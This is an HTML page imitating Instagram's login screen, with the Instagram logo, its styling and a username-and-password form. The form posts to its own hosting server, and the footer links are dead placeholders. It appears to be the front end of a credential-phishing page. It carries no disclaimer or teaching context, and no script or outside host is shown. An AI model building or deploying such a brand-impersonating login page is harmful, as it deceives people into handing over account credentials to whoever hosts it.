<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	<title>Instagram Login</title>
	<!-- Instagram logo favicon for metadata -->
	<link href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1024px-Instagram_logo_2016.svg.png" rel="icon" type="image/png"/>
	<style type="text/css">body {
        font-family: Arial, Helvetica, sans-serif;
        background-color: #fafafa;
        display: flex;
        justify-content: center;
        align-items: flex-start;
        min-height: 100vh;
        margin: 0;
        padding-top: 50px;
    }

    .login-container {
        background-color: #fff;
        border: 1px solid #dbdbdb;
        border-radius: 5px;
        width: 100%;
        max-width: 350px;
        text-align: center;
        padding: 40px 30px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    .header-logo {
        width: 175px;
        height: 51px;
        background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/175px-Instagram_logo_2016.svg.png');
        background-size: contain;
        background-repeat: no-repeat;
        background-position: center;
        margin: 0 auto 30px auto;
    }

    input[type="text"], input[type="password"] {
        width: 80%;
        padding: 10px 12px;
        margin: 8px auto;
        border-radius: 3px;
        border: 1px solid #dbdbdb;
        font-size: 14px;
        display: block;
        box-sizing: border-box;
    }

    input[type="submit"] {
        width: 80%;
        padding: 10px;
        margin: 15px auto 0 auto;
        background-color: #0095f6;
        border: none;
        border-radius: 4px;
        color: white;
        font-size: 14px;
        cursor: pointer;
        display: block;
    }

    input[type="submit"]:hover {
        background-color: #0073cc;
    }

    .footer-links {
        margin-top: 20px;
        font-size: 12px;
        color: #999;
    }

    .footer-links a {
        color: #00376b;
        text-decoration: none;
        margin: 0 5px;
    }

    .footer-links a:hover {
        text-decoration: underline;
    }
	</style>
</head>
<body>
<div class="login-container">
<div class="header-logo"> </div>

<form action="" method="POST"><input name="username" placeholder="Phone number, username, or email" required="" type="text"/> <input name="password" placeholder="Password" required="" type="password"/> <input type="submit" value="Log In"/> </form>

<div class="footer-links"><a href="#">Forgot password?</a> • <a href="#">Sign up</a></div>
</div>


</body></html>
